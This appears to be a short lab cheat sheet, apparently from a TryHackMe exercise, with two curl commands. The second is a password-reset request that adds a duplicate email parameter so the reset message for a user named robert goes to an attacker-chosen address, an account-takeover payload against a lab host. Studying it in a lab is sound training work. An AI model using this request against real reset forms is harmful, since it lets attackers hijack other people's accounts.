**Basic Curl**

```
curl axonia.co -o output.txt
```


**Password Reset Email Reroute**

```
curl 'http://10.10.160.36/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
```

